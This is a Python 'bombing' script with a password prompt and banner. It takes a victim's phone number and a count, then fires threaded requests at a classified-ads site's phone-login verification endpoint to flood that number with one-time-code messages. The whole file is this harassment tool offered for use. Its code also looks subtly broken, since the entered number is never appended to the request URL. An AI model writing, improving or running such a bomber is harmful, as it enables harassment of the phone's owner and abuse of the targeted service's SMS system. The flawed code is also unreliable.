import os, time, threading, requests

# --- Settings ---
NAME = "JANINA"
PASSWORD = "kire"
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print("\033[1;32m")
    # Real Shadow Banner Engine
    print(r"""      ██╗   █████╗   ███╗  ██╗  ██╗  ███╗  ██╗   █████╗  \n      ██║  ██╔══██╗  ████╗ ██║  ██║  ████╗ ██║  ██╔══██╗ \n      ██║  ███████║  ██╔██╗██║  ██║  ██╔██╗██║  ███████║ \n ██   ██║  ██╔══██║  ██║╚████║  ██║  ██║╚████║  ██╔══██║ \n ╚█████╔╝  ██║  ██║  ██║ ╚███║  ██║  ██║ ╚███║  ██║  ██║ """)
    print("=" * 60)
    print(f"       CREATED BY: {NAME} BOMBING SYSTEM")
    print("=" * 60 + "\033[0m")

def password_check():
    print(f"\033[1;31m[!] {NAME} SCRIPT IS PROTECTED\033[0m")
    if input("ENTER PASSWORD: ") != PASSWORD:
        print("[-] WRONG PASSWORD! EXITING..."); exit()
    print("\033[1;32m[+] ACCESS GRANTED!\033[0m")

counter = 0
lock = threading.Lock()

def send_req(url):
    global counter
    try:
        res = requests.get(url, headers=HEADERS, timeout=10)
        if res.status_code == 200:
            with lock:
                counter += 1
                print(f"\033[1;36m[+] SUCCESS] Request Sent: {counter}\033[0m")
    except: pass

def start():
    banner()
    password_check()
    target = input("\nTARGET NUMBER: ")
    if len(target) != 11: print("Invalid Number!"); return
    amount = int(input("ENTER AMOUNT: "))
    
    api_list = [
        {"url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=", "method": "GET"},

    ]

    print(f"\n\033[1;33m[!] ATTACK STARTED ON {target}...\033[0m")
    threads = []
    for _ in range(amount):
        for api in api_list:
            t = threading.Thread(target=send_req, args=(api['url'],))
            t.start()
            threads.append(t)
            time.sleep(0.2)
    
    for t in threads: t.join()
    print("\n\033[1;32m[✔] ALL REQUESTS FINISHED!\033[0m")

if __name__ == "__main__":
    start()
